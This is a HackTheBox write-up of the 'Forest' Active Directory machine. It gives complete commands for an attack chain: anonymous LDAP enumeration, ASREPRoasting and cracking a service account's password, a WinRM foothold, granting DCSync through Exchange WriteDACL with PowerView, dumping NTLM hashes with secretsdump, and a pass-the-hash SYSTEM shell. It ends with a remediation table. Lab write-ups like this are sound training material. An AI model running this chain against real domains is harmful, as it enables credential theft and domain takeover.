---
title: "HTB — Forest (Easy Windows AD): ASREPRoast + DCSync via Exchange WriteDACL"
date: 2026-05-18 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, asreproast, dcsync, exchange, writedacl, pass-the-hash, easy]
---

**IP:** 10.129.36.191 | **Difficulty:** Easy | **OS:** Windows Server 2016 DC | **Domain:** htb.local

## Summary

Domain Controller with Exchange installed. LDAP allows anonymous bind, exposing all domain users. The service account `svc-alfresco` has Kerberos pre-authentication disabled (ASREPRoastable). After cracking the hash and getting a WinRM shell, nested group membership in Account Operators → Exchange Windows Permissions (WriteDACL on the domain object) is abused to grant DCSync rights, dumping all NTLM hashes.

---

## 1. Reconnaissance

```bash
nmap -sV -sC -T4 -Pn 10.129.36.191
```

```
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
389/tcp  open  ldap    (Domain: htb.local)
445/tcp  open  microsoft-ds
5985/tcp open  http    WinRM
```

---

## 2. LDAP Enumeration (Anonymous Bind)

```bash
echo "10.129.36.191 htb.local" | sudo tee -a /etc/hosts

ldapsearch -x -H ldap://10.129.36.191:389 \
  -b "dc=htb,dc=local" \
  "(sAMAccountType=805306368)" sAMAccountName
```

LDAP accepts anonymous bind (`-x`). Returns all domain users including `svc-alfresco` — an Alfresco service account that **requires** pre-auth disabled → **ASREPRoastable**.

---

## 3. ASREPRoasting — svc-alfresco

```bash
GetNPUsers.py htb.local/ -dc-ip 10.129.36.191 \
  -usersfile /tmp/users.txt -no-pass -format hashcat
```

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:19ee5538...
```

```bash
john hash.txt --wordlist=rockyou.txt --format=krb5asrep
# s3rvice
```

---

## 4. Foothold — Evil-WinRM

```bash
evil-winrm -i 10.129.36.191 -u svc-alfresco -p s3rvice
type C:\Users\svc-alfresco\Desktop\user.txt
# <hash>
```

---

## 5. Privilege Escalation — DCSync via Exchange WriteDACL

BloodHound reveals the chain:

```
svc-alfresco → Service Accounts → Privileged IT Accounts → Account Operators
```

**Exchange Windows Permissions** has `WriteDACL` on the domain object → we can add **DCSync** (DS-Replication-Get-Changes-All).

**Step 1 — Create a user and add to required groups:**

```powershell
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

**Step 2 — Grant DCSync with PowerView:**

```powershell
. .\PowerView.ps1
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

**Step 3 — Dump all NTLM hashes:**

```bash
secretsdump.py htb/john:'abc123!'@10.129.36.191
# Administrator:500:...:<hash>:::
```

**Step 4 — Pass-the-Hash:**

```bash
psexec.py administrator@10.129.36.191 \
  -hashes <hash>:<hash>
# nt authority\system

type C:\Users\Administrator\Desktop\root.txt
# <hash>
```

---

## Attack Chain

```
LDAP anon bind → enumerate svc-alfresco (ASREPRoastable)
  ↓ GetNPUsers → hash → john → s3rvice
  ↓ Evil-WinRM svc-alfresco:s3rvice → user.txt
  ↓ Account Operators (nested) → Exchange Windows Permissions → WriteDACL
  ↓ net user john + PowerView Add-ObjectACL → DCSync
  ↓ secretsdump → Administrator NTLM
  ↓ psexec PtH → nt authority\system → root.txt
```

---

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| LDAP anonymous bind enabled | Disable null/anonymous bind in AD |
| Kerberos pre-auth disabled | Enable pre-auth on all accounts |
| Weak service account password (`s3rvice`) | Use MSAs / password managers for service accounts |
| Exchange WriteDACL on domain object | Remove excessive Exchange permissions (Microsoft KB mitigation) |
| No DCSync monitoring | Monitor event 4662; use Protected Users group for privileged accounts |
